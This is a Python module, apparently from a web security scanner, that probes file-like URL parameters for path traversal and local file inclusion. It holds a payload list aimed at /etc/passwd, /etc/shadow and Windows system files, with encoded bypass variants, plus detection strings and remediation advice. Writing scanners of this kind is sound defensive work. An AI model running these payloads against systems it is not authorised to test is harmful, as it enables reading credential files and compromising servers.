"""BurpNext Active Scanner — Path Traversal / LFI"""
import aiohttp, urllib.parse, logging
from typing import List
logger = logging.getLogger("burpnext.traversal")

FILE_PARAMS = ["file","path","page","include","template","doc","read","view","load","download","img","image"]
PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%252e%252e%252fetc%252fpasswd",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
]
INDICATORS = ["root:x:0:0","daemon:","bin:/bin","[boot loader]","[extensions]","localhost"]

async def test(session, url: str, params: List[str], method: str="GET") -> List[dict]:
    findings = []
    file_params = [p for p in params if any(k in p.lower() for k in FILE_PARAMS)]
    for param in file_params[:3]:
        for payload in PAYLOADS:
            try:
                to = aiohttp.ClientTimeout(total=8)
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                async with session.get(test_url, ssl=False, allow_redirects=False, timeout=to) as r:
                    body = (await r.content.read(16384)).decode("utf-8","ignore")
                    if any(ind in body for ind in INDICATORS):
                        target_file = "etc/passwd" if "passwd" in payload else "windows/win.ini"
                        findings.append({
                            "title": f"Path Traversal / LFI — {target_file} Read via '{param}'",
                            "severity": "Critical", "cvss": 9.1, "confidence": "High",
                            "cwe": "CWE-22", "owasp": "A01:2021",
                            "url": url, "method": method, "parameter": param,
                            "payload": payload, "evidence": body[:400],
                            "description": f"Arbitrary file read confirmed via '{param}' — path traversal bypasses directory restrictions.",
                            "why": "Attacker reads /etc/shadow (password hashes), SSH private keys (~/.ssh/id_rsa), application config files with DB credentials. Escalates to RCE via log poisoning.",
                            "business_impact": "Server compromise via credential theft. Complete filesystem access.",
                            "remediation": "Validate and sanitize file paths. Use realpath() and check prefix.",
                            "steps": [
                                "PHP: $path = realpath('/var/www/files/' . $input); if (!str_starts_with($path, '/var/www/files/')) die('Invalid');",
                                "Python: path = os.path.realpath(base + '/' + input); assert path.startswith(base)",
                                "Whitelist allowed filenames — never accept paths with ../",
                                "Serve files from dedicated CDN/S3 — web process has no filesystem access",
                                "Chroot web application process to its document root",
                            ],
                            "request_raw": f"GET {test_url} HTTP/1.1",
                        })
                        return findings
            except Exception as e:
                logger.debug(f"[Traversal] {param}/{payload}: {e}")
    return findings
